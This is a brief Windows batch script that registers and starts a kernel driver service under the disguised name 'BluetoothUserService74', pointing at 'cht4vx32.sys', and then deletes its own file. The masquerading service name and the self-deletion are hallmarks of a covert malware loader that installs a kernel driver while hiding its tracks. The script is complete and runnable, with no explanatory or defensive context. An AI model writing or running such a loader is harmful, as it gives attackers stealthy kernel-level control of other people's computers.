@echo off
cd %~dp0
sc create BluetoothUserService74 binpath=C:\Windows\System32\drivers\cht4vx32.sys type=kernel
sc start BluetoothUserService74
del "%~f0"